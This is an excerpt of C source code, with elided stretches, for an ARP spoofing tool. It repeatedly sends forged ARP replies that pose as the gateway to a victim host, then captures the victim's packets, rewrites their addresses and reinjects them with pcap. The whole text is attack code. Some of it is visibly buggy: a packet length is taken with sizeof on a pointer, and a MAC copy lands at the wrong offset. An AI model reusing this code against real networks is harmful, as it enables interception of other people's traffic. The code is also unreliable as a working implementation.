...
unsigned char  rely_packet[1500];
int rely_pcaket_size;
// packet sum size
static int g_sock;
	...
	const u_char *packet)
{
		...
		string_same((unsigned char*)(packet + 26), (unsigned char*)sender_ip, 4))
	{
		...
		flag = 2;
		rely_pcaket_size = sizeof(packet);
		string_copy((unsigned char*)rely_packet, (unsigned char*)packet, sizeof(packet));
		string_copy((unsigned char*)rely_packet, (unsigned char*)MY_mac, 6);
		string_copy((unsigned char*)rely_packet + 26, (unsigned char*)MY_IP, 4);
	}
...
void arp_proofing()
{
	...
	while (1) {
		...
		if (flag == 1 || flag == 0)
		{
			string_copy(h_dest, sender_mac, 6);
			string_copy(h_source, MY_mac, 6);
			string_copy(ar_sha, MY_mac, 6);
			string_copy(ar_sip, gw_IP, 4);
			string_copy(ar_tha, sender_mac, 6);
			string_copy(ar_tip, sender_ip, 4);
		...
		if (flag == 2)
		{
			pcap_inject(pcd, (const void*)rely_packet, rely_pcaket_size);
			printf("I_send_to_gateway\n");
			flag = 0;
		}
	}
	pcap_close(pcd);
...
void having_sender_mac(unsigned char* sender_ip)
{
	...
	string_copy(h_source, MY_mac, 6);
	string_copy(ar_sha, MY_mac, 6);
	inet_aton("192.168.0.21", (in_addr*)ar_sip);
